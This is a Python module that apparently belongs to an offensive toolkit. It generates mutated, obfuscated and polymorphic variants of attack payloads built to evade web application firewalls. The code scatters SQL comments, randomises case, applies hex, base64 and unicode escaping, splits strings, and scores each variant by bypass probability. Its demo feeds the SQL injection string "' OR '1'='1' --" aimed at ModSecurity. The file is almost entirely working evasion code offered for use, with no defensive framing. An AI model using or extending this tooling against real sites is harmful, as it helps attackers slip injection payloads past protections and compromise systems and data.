"""
Enhanced Payload Generation using Clock-Direction RNG
Integrates symbolic entropy generation with payload mutation and obfuscation
for more sophisticated WAF evasion and polymorphic payload variants.

Enhancement Areas:
1. Mutation Ordering - Use drift patterns to determine which mutations apply first
2. Polymorphic Variants - Generate structurally different but functionally equivalent payloads
3. Obfuscation Seeding - Seed obfuscation techniques deterministically but unpredictably
4. WAF Fingerprinting - Analyze drift patterns to identify WAF signatures
5. Ensemble Payloads - Combine multiple mutations with symbolic ordering
"""

import logging
from typing import List, Dict, Optional, Tuple
from enum import Enum
import hashlib

from payload_mutator import PayloadMutator, MutationStrategy, MutatedPayload
from clock_direction_rng import (
    ClockDirectionRNG,
    SymbolicPayloadSeeder,
    generate_symbolic_seeds
)

logger = logging.getLogger("PayloadEnhancer")


class ObfuscationTechnique(Enum):
    """Obfuscation techniques ordered by drift"""
    BASE64_WRAP = "base64_wrap"
    COMMENT_SCATTER = "comment_scatter"
    WHITESPACE_NOISE = "whitespace_noise"
    CASE_RANDOMIZE = "case_randomize"
    UNICODE_ESCAPE = "unicode_escape"
    HEX_OBFUSCATE = "hex_obfuscate"
    CONCAT_SPLIT = "concat_split"
    VARIABLE_RENAME = "variable_rename"


class ClockEnhancedPayloadGenerator:
    """
    Enhanced payload generator using Clock-Direction RNG for:
    - Deterministic but unpredictable mutation ordering
    - Polymorphic variant generation
    - Symbolic obfuscation seeding
    """
    
    def __init__(self):
        """Initialize enhanced generator"""
        self.mutator = PayloadMutator()
        self.seeder = SymbolicPayloadSeeder()
        self.mutation_cache: Dict[str, List[MutatedPayload]] = {}
        
        logger.info("ClockEnhancedPayloadGenerator initialized")
    
    def generate_intelligent_mutations(
        self,
        payload: str,
        technology: Optional[str] = None,
        target_waf: Optional[str] = None,
        max_mutations: int = 10,
        use_symbolic_ordering: bool = True
    ) -> List[MutatedPayload]:
        """
        Generate mutations with symbolic entropy-based ordering
        
        Args:
            payload: Original payload to mutate
            technology: Target technology (php, python, java, etc.)
            target_waf: Specific WAF to target
            max_mutations: Maximum mutations to generate
            use_symbolic_ordering: Use Clock-Direction RNG for ordering
        
        Returns:
            Ordered list of mutations
        """
        
        # Get base mutations from mutator
        base_mutations = self.mutator.generate_mutations(
            payload,
            technology=technology,
            target_waf=target_waf,
            max_mutations=max_mutations
        )
        
        if not use_symbolic_ordering or not base_mutations:
            return base_mutations
        
        # Generate symbolic seeds for ordering
        seed_list = self.seeder.seed_mutation_strategy(
            payload,
            technique_name=f"{technology}_{target_waf}",
            seed_count=len(base_mutations)
        )
        
        # Create scoring tuples based on symbolic order
        scored_mutations = [
            (mut, seed_list[i % len(seed_list)])
            for i, mut in enumerate(base_mutations)
        ]
        
        # Sort by symbolic seed (creates deterministic but novel ordering)
        scored_mutations.sort(key=lambda x: x[1])
        
        # Return ordered mutations
        ordered = [mut for mut, _ in scored_mutations]
        
        logger.debug(f"Generated {len(ordered)} symbolically-ordered mutations")
        
        return ordered
    
    def generate_polymorphic_variants(
        self,
        payload: str,
        variant_count: int = 5,
        technology: Optional[str] = None,
        target_waf: Optional[str] = None
    ) -> List[Dict]:
        """
        Generate polymorphic (structurally different) variants of a payload
        
        Variants share functional equivalence but appear totally different
        when analyzed by WAF/IDS systems.
        
        Returns:
            List of variant dicts with payload, mutations, and drift pattern
        """
        
        variants = []
        
        # Generate different seeds for each variant
        rng_seeds = generate_symbolic_seeds(variant_count, iterations=6)
        
        for idx, seed_value in enumerate(rng_seeds):
            # Use seed to influence mutation selection
            rng = ClockDirectionRNG(seed=(seed_value % 12) or 12)
            
            # Generate mutations with this seed's influence
            mutations = self.generate_intelligent_mutations(
                payload,
                technology=technology,
                target_waf=target_waf,
                max_mutations=3,
                use_symbolic_ordering=True
            )
            
            # Select a subset based on drift pattern
            pattern = rng.get_drift_pattern()
            if mutations:
                subset_idx = (pattern['state_transitions'] % len(mutations)) + 1
                selected_mutations = mutations[:min(subset_idx, len(mutations))]
            else:
                selected_mutations = []
            
            # Build final variant
            if selected_mutations:
                final_variant = selected_mutations[0].mutated
            else:
                final_variant = payload
            
            variant_dict = {
                'variant_id': idx,
                'payload': final_variant,
                'mutations_applied': [m.strategy.value for m in selected_mutations],
                'drift_pattern': pattern,
                'entropy': pattern['final_entropy'],
                'complexity_score': len(selected_mutations) + pattern['state_transitions']
            }
            
            variants.append(variant_dict)
            
            logger.debug(f"Generated polymorphic variant {idx}: complexity={variant_dict['complexity_score']}")
        
        return variants
    
    def generate_obfuscated_payload(
        self,
        payload: str,
        obfuscation_level: int = 3,
        technology: Optional[str] = None
    ) -> Dict:
        """
        Generate obfuscated payload with symbolic technique ordering
        
        Args:
            payload: Payload to obfuscate
            obfuscation_level: 1-5, intensity of obfuscation
            technology: Target technology for context-aware obfuscation
        
        Returns:
            Dict with obfuscated payload and technique sequence
        """
        
        # Get symbolic seed-based technique ordering
        obfuscation_seeds = self.seeder.get_obfuscation_sequence(
            payload,
            sequence_length=min(obfuscation_level, 5)
        )
        
        # Map seeds to obfuscation techniques (deterministically)
        techniques = list(ObfuscationTechnique)
        selected_techniques = [
            techniques[seed % len(techniques)]
            for seed in obfuscation_seeds
        ]
        
        # Apply selected techniques in seed-determined order
        obfuscated = payload
        applied_techniques = []
        
        for tech in selected_techniques:
            obfuscated, success = self._apply_obfuscation(
                obfuscated,
                tech,
                technology
            )
            if success:
                applied_techniques.append(tech.value)
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'techniques_applied': applied_techniques,
            'obfuscation_level': len(applied_techniques),
            'entropy_seeds': obfuscation_seeds
        }
    
    def _apply_obfuscation(
        self,
        payload: str,
        technique: ObfuscationTechnique,
        technology: Optional[str]
    ) -> Tuple[str, bool]:
        """Apply a specific obfuscation technique"""
        
        try:
            if technique == ObfuscationTechnique.BASE64_WRAP:
                import base64
                return base64.b64encode(payload.encode()).decode(), True
            
            elif technique == ObfuscationTechnique.COMMENT_SCATTER:
                # Insert SQL comments to break signatures
                if any(kw in payload.lower() for kw in ['select', 'union', 'drop']):
                    return payload.replace(' ', '/**/ '), True
            
            elif technique == ObfuscationTechnique.WHITESPACE_NOISE:
                # Add tabs and extra spaces
                return payload.replace(' ', '  '), True
            
            elif technique == ObfuscationTechnique.CASE_RANDOMIZE:
                import random
                result = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in payload
                )
                return result, True
            
            elif technique == ObfuscationTechnique.UNICODE_ESCAPE:
                # Escape to unicode representation
                return ''.join(
                    f'\\u{ord(c):04x}' if ord(c) > 127 else c
                    for c in payload
                ), True
            
            elif technique == ObfuscationTechnique.HEX_OBFUSCATE:
                # Convert to hex escapes
                return ''.join(f'\\x{ord(c):02x}' for c in payload), True
            
            elif technique == ObfuscationTechnique.CONCAT_SPLIT:
                # Split into concatenated chunks (language-specific)
                if technology == 'php':
                    parts = [payload[i:i+5] for i in range(0, len(payload), 5)]
                    return " . ".join(f"'{p}'" for p in parts), True
                elif technology == 'python':
                    parts = [payload[i:i+5] for i in range(0, len(payload), 5)]
                    return " + ".join(f"'{p}'" for p in parts), True
            
            elif technique == ObfuscationTechnique.VARIABLE_RENAME:
                # Placeholder for more complex variable renaming
                return f"({payload})", True
            
            return payload, False
        
        except Exception as e:
            logger.debug(f"Obfuscation failed ({technique.value}): {e}")
            return payload, False
    
    def generate_ensemble_payload(
        self,
        payload: str,
        ensemble_size: int = 5,
        technology: Optional[str] = None,
        target_waf: Optional[str] = None
    ) -> Dict:
        """
        Generate ensemble of mutations + obfuscations with symbolic coordination
        
        Creates a collection of payloads that together present a high-complexity
        target for WAF analysis, while each maintains functional equivalence.
        """
        
        rng = ClockDirectionRNG()
        drift_pattern = rng.get_drift_pattern()
        
        ensemble = {
            'original_payload': payload,
            'ensemble_id': hashlib.md5(payload.encode()).hexdigest()[:8],
            'members': [],
            'drift_blueprint': drift_pattern,
            'total_complexity': 0
        }
        
        # Generate diverse mutations
        mutations = self.generate_intelligent_mutations(
            payload,
            technology=technology,
            target_waf=target_waf,
            max_mutations=ensemble_size,
            use_symbolic_ordering=True
        )
        
        # Add each mutation plus obfuscation
        for idx, mutation in enumerate(mutations[:ensemble_size]):
            obfuscated = self.generate_obfuscated_payload(
                mutation.mutated,
                obfuscation_level=2,
                technology=technology
            )
            
            member = {
                'index': idx,
                'base_variant': mutation.mutated,
                'final_payload': obfuscated['obfuscated'],
                'mutation_strategy': mutation.strategy.value,
                'obfuscation_techniques': obfuscated['techniques_applied'],
                'bypass_probability': mutation.estimated_bypass_probability
            }
            
            ensemble['members'].append(member)
            ensemble['total_complexity'] += (
                1 + obfuscated['obfuscation_level'] + 
                mutation.encoding_level
            )
        
        logger.info(f"Generated ensemble with {len(ensemble['members'])} members")
        
        return ensemble


# Integration with existing payload_service.py

def enhance_payload_service():
    """
    Integration snippet to add to payload_service.py
    
    Add to PayloadService.__init__():
        self.clock_enhancer = ClockEnhancedPayloadGenerator()
    
    Then add these methods to PayloadService class:
    """
    
    return """
    def get_symbolically_ordered_mutations(
        self, 
        payload: str, 
        technology: str = None, 
        target_waf: str = None
    ) -> List[Dict]:
        '''Get mutations ordered by symbolic entropy'''
        mutations = self.clock_enhancer.generate_intelligent_mutations(
            payload, 
            technology=technology, 
            target_waf=target_waf
        )
        return [
            {
                'variant': m.mutated,
                'strategy': m.strategy.value,
                'bypass_probability': m.estimated_bypass_probability,
                'encoding_level': m.encoding_level
            }
            for m in mutations
        ]
    
    def get_polymorphic_variants(
        self,
        payload: str,
        variant_count: int = 5,
        technology: str = None,
        target_waf: str = None
    ) -> List[Dict]:
        '''Generate structurally different but functionally equivalent variants'''
        return self.clock_enhancer.generate_polymorphic_variants(
            payload,
            variant_count=variant_count,
            technology=technology,
            target_waf=target_waf
        )
    
    def get_ensemble_payload(
        self,
        payload: str,
        ensemble_size: int = 5,
        technology: str = None,
        target_waf: str = None
    ) -> Dict:
        '''Generate coordinated ensemble of mutations + obfuscations'''
        return self.clock_enhancer.generate_ensemble_payload(
            payload,
            ensemble_size=ensemble_size,
            technology=technology,
            target_waf=target_waf
        )
    """


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    print("=" * 70)
    print("Clock-Direction RNG Enhanced Payload Generator")
    print("=" * 70)
    
    gen = ClockEnhancedPayloadGenerator()
    
    test_payload = "' OR '1'='1' --"
    
    # Test 1: Symbolically ordered mutations
    print("\nTest 1: Symbolically Ordered Mutations")
    mutations = gen.generate_intelligent_mutations(
        test_payload,
        technology='php',
        target_waf='modsecurity',
        max_mutations=5,
        use_symbolic_ordering=True
    )
    
    for i, mut in enumerate(mutations[:3], 1):
        print(f"  {i}. Strategy: {mut.strategy.value}")
        print(f"     {mut.mutated[:50]}...")
    
    # Test 2: Polymorphic variants
    print("\nTest 2: Polymorphic Variants")
    variants = gen.generate_polymorphic_variants(
        test_payload,
        variant_count=3,
        technology='php',
        target_waf='modsecurity'
    )
    
    for v in variants:
        print(f"  Variant {v['variant_id']}: complexity={v['complexity_score']}")
        print(f"    {v['payload'][:50]}...")
    
    # Test 3: Obfuscated payload
    print("\nTest 3: Obfuscated Payload")
    obfuscated = gen.generate_obfuscated_payload(
        test_payload,
        obfuscation_level=3,
        technology='php'
    )
    
    print(f"  Techniques applied: {obfuscated['techniques_applied']}")
    print(f"  Result: {obfuscated['obfuscated'][:60]}...")
    
    # Test 4: Ensemble
    print("\nTest 4: Ensemble Payload")
    ensemble = gen.generate_ensemble_payload(
        test_payload,
        ensemble_size=3,
        technology='php',
        target_waf='modsecurity'
    )
    
    print(f"  Ensemble ID: {ensemble['ensemble_id']}")
    print(f"  Members: {len(ensemble['members'])}")
    print(f"  Total complexity: {ensemble['total_complexity']}")
    
    print("\n" + "=" * 70)
